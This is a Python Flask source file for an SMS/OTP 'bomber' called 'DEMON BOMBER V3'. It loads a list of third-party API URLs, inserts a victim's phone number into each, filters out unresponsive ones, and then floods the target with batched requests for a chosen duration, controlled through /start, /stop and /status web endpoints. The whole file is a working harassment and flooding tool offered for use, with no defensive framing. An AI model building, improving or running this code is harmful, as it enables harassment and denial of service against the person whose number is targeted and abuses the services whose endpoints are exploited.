from flask import Flask, request, jsonify
import aiohttp
import asyncio
import threading
import time
import os
import json
from datetime import datetime, timedelta

app = Flask(__name__)

# Global state
attack_status = {
    'running': False,
    'target': None,
    'duration': 0,
    'total_hits': 0,
    'real_hits': 0,
    'apis_loaded': 0,
    'dead_apis': 0,
    'working_apis': 0,
    'start_time': None
}

# Store dead APIs to skip
dead_apis = set()
working_apis = []
api_lock = threading.Lock()

# Load APIs with caching
def load_apis():
    global working_apis
    apis = []
    filename = 'bomber_apis.txt'
    try:
        with open(filename, 'r', encoding='utf-8') as f:
            for line in f:
                url = line.strip()
                if url.startswith('http'):
                    url = url.split(' ')[0].split('\n')[0]
                    if url and url.startswith('http'):
                        apis.append(url)
    except:
        pass
    return apis

# Test single API
async def test_api(session, url, target):
    try:
        formatted = (url.replace('{target}', target)
                       .replace('{num}', target)
                       .replace('{phone}', target)
                       .replace('{no}', target))
        
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        
        async with session.get(formatted, headers=headers, timeout=3) as response:
            if response.status in [200, 201, 202, 204]:
                return url, True
    except:
        pass
    return url, False

# Filter dead APIs (runs once at start)
async def filter_dead_apis(target):
    global working_apis, dead_apis
    all_apis = load_apis()
    
    if not all_apis:
        return []
    
    print(f"[+] Testing {len(all_apis)} APIs for dead ones...")
    
    working = []
    dead = []
    
    async with aiohttp.ClientSession() as session:
        # Test in batches of 50
        for i in range(0, len(all_apis), 50):
            batch = all_apis[i:i+50]
            tasks = [test_api(session, url, target) for url in batch]
            results = await asyncio.gather(*tasks)
            
            for url, is_working in results:
                if is_working:
                    working.append(url)
                else:
                    dead.append(url)
            
            print(f"[+] Progress: {len(working)} working, {len(dead)} dead out of {i+len(batch)}")
            await asyncio.sleep(0.5)  # Don't hammer
    
    with api_lock:
        working_apis = working
        dead_apis = set(dead)
    
    attack_status['working_apis'] = len(working)
    attack_status['dead_apis'] = len(dead)
    
    print(f"[+] Filter complete: {len(working)} working APIs found")
    
    # Save working APIs for future
    with open('working_apis.txt', 'w') as f:
        f.write('\n'.join(working))
    
    return working

# Main attack function with auto-filter
async def attack_loop(target, duration):
    global working_apis, dead_apis
    
    attack_status['running'] = True
    attack_status['target'] = target
    attack_status['duration'] = duration
    attack_status['total_hits'] = 0
    attack_status['real_hits'] = 0
    attack_status['start_time'] = datetime.now().isoformat()
    
    # Load all APIs
    all_apis = load_apis()
    if not all_apis:
        attack_status['running'] = False
        return
    
    attack_status['apis_loaded'] = len(all_apis)
    
    # Filter dead APIs if not done yet
    if not working_apis and not dead_apis:
        print("[+] First run: Filtering dead APIs...")
        await filter_dead_apis(target)
    
    # Use working APIs
    apis_to_use = working_apis if working_apis else all_apis
    
    if not apis_to_use:
        attack_status['running'] = False
        return
    
    print(f"[+] Using {len(apis_to_use)} working APIs")
    
    end_time = time.time() + duration
    success_count = 0
    real_count = 0
    api_index = 0
    
    async with aiohttp.ClientSession() as session:
        while time.time() < end_time and attack_status['running']:
            # Take 50 APIs per cycle
            batch_size = min(50, len(apis_to_use))
            batch = apis_to_use[api_index:api_index + batch_size]
            
            if not batch:
                api_index = 0
                continue
            
            tasks = [hit_api(session, url, target) for url in batch]
            results = await asyncio.gather(*tasks)
            
            # Process results and update dead list
            for i, (url, success) in enumerate(results):
                if success:
                    success_count += 1
                    real_count += 1
                else:
                    # If API fails, mark as dead
                    if url not in dead_apis:
                        with api_lock:
                            dead_apis.add(url)
                            if url in working_apis:
                                working_apis.remove(url)
            
            attack_status['total_hits'] = success_count
            attack_status['real_hits'] = real_count
            attack_status['working_apis'] = len(working_apis)
            attack_status['dead_apis'] = len(dead_apis)
            
            # Update working APIs list dynamically
            api_index += batch_size
            if api_index >= len(apis_to_use):
                api_index = 0
                print(f"[+] Cycle complete - Hits: {success_count}, Working: {len(working_apis)}")
            
            await asyncio.sleep(0.3)
    
    attack_status['running'] = False

async def hit_api(session, url, target):
    try:
        formatted = (url.replace('{target}', target)
                       .replace('{num}', target)
                       .replace('{phone}', target)
                       .replace('{no}', target))
        
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        
        async with session.get(formatted, headers=headers, timeout=3) as response:
            if response.status in [200, 201, 202, 204, 302, 301]:
                return url, True
    except:
        pass
    return url, False

# -------- FLASK API ENDPOINTS --------

app = Flask(__name__)

@app.route('/')
def home():
    return '''
    <h1>🔥 DEMON BOMBER V3 - AUTO FILTER 🔥</h1>
    <p>Endpoints:</p>
    <ul>
        <li><b>GET /start?target=9876543210&duration=60</b> - Start attack (auto-filters dead APIs)</li>
        <li><b>GET /status</b> - Check status with dead/working stats</li>
        <li><b>GET /filter?target=9876543210</b> - Manually filter dead APIs</li>
        <li><b>GET /stats</b> - API statistics</li>
    </ul>
    '''

@app.route('/start')
def start_attack():
    target = request.args.get('target')
    duration = int(request.args.get('duration', 60))
    
    if not target:
        return jsonify({'error': 'Missing target!'}), 400
    
    if attack_status['running']:
        return jsonify({'error': 'Attack already running! Use /stop'}), 400
    
    # Start attack in background
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    thread = threading.Thread(target=lambda: loop.run_until_complete(attack_loop(target, duration)))
    thread.start()
    
    return jsonify({
        'success': True,
        'target': target,
        'duration': duration,
        'message': 'Attack started with auto-filter'
    })

@app.route('/status')
def get_status():
    return jsonify({
        'running': attack_status['running'],
        'target': attack_status['target'],
        'duration': attack_status['duration'],
        'total_hits': attack_status['total_hits'],
        'real_hits': attack_status['real_hits'],
        'apis_loaded': attack_status['apis_loaded'],
        'working_apis': attack_status['working_apis'],
        'dead_apis': attack_status['dead_apis'],
        'start_time': attack_status['start_time']
    })

@app.route('/filter')
def filter_apis():
    target = request.args.get('target', '9876543210')
    
    if attack_status['running']:
        return jsonify({'error': 'Attack is running! Stop first.'}), 400
    
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    result = loop.run_until_complete(filter_dead_apis(target))
    
    return jsonify({
        'success': True,
        'total_tested': attack_status['apis_loaded'],
        'working': attack_status['working_apis'],
        'dead': attack_status['dead_apis'],
        'working_list': result[:20]  # Show first 20
    })

@app.route('/stats')
def get_stats():
    all_apis = load_apis()
    return jsonify({
        'total_apis': len(all_apis),
        'working': attack_status['working_apis'],
        'dead': attack_status['dead_apis'],
        'efficiency': f"{(attack_status['working_apis'] / len(all_apis) * 100) if all_apis else 0:.1f}%"
    })

@app.route('/stop')
def stop_attack():
    global attack_status
    if attack_status['running']:
        attack_status['running'] = False
        return jsonify({'success': True, 'message': 'Attack stopped!'})
    return jsonify({'success': False, 'message': 'No attack running.'})

@app.route('/health')
def health():
    return jsonify({'status': 'alive', 'working_apis': attack_status['working_apis']})

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
